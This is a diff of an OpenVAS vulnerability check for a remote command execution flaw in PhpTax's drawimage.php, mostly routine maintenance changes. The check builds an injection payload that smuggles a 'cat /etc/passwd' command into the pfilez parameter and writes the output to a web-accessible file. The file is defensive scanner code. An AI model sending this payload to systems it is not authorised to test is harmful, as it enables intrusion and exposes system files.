@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_phptax_55759.nasl 11066 2018-08-21 10:57:20Z asteins $
+# $Id: gb_phptax_55759.nasl 11435 2018-09-17 13:44:25Z cfischer $
 #
 # PhpTax 'drawimage.php' Remote Arbitrary Command Execution Vulnerability
 #
@@ -25,16 +25,16 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-if (description)
+if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.103582");
   script_bugtraq_id(55759);
   script_tag(name:"cvss_base", value:"9.7");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:P/A:C");
-  script_version("$Revision: 11066 $");
+  script_version("$Revision: 11435 $");
   script_name("PhpTax 'drawimage.php' Remote Arbitrary Command Execution Vulnerability");
   script_xref(name:"URL", value:"http://www.securityfocus.com/bid/55759");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-21 12:57:20 +0200 (Tue, 21 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-17 15:44:25 +0200 (Mon, 17 Sep 2018) $");
   script_tag(name:"creation_date", value:"2012-10-09 14:42:33 +0200 (Tue, 09 Oct 2012)");
   script_category(ACT_ATTACK);
   script_tag(name:"qod_type", value:"remote_vul");
@@ -62,9 +62,11 @@ Likely none will be provided anymore. General solution options are to upgrade to
 
 include("http_func.inc");
 include("http_keepalive.inc");
+include("misc_func.inc");
 
 port = get_http_port( default:80 );
 if( ! can_host_php( port:port ) ) exit( 0 );
+vtstring = get_vt_string( lowercase:TRUE );
 
 foreach dir( make_list_unique( "/phptax", "/tax", cgi_dirs( port:port ) ) ) {
 
@@ -74,7 +76,7 @@ foreach dir( make_list_unique( "/phptax", "/tax", cgi_dirs( port:port ) ) ) {
 
   if( "<title>PHPTAX" >< buf ) {
 
-    file = 'openvas_' + rand() + '.txt';
+    file = vtstring + '_' + rand() + '.txt';
     ex = 'xx%3bcat+%2Fetc%2Fpasswd+%3E+.%2F' + file  + '%3b';
     url = dir + '/drawimage.php?pdf=make&pfilez=' + ex;
 
